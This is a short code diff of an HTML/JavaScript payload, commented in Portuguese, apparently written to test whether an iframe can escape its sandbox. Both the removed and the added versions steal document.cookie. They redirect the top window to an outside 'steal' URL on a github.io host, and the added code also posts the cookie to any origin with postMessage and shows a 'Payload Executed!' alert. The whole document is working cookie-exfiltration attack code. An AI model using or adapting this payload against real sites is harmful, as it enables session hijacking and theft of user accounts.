@@ -1,5 +1,15 @@
-<html>
 <script>
-  window.top.location = "https://pedrojuniorrd.github.io/steal?cookie=" + encodeURIComponent(document.cookie);
-  </script>
-</html>
+  // Tenta enviar dados via postMessage
+window.top.postMessage("Exfil: " + document.cookie, "*");
+
+// Tenta forçar redirecionamento da página principal
+try {
+    window.top.location = "https://pedrojuniorrd.github.io/steal?cookie=" + encodeURIComponent(document.cookie);
+} catch (e) {
+    console.log("Navigation blocked by CSP or sandbox.");
+}
+
+// Tenta disparar um XSS visual dentro do próprio iframe (se for o caso)
+alert("Payload Executed!");
+
+</script>
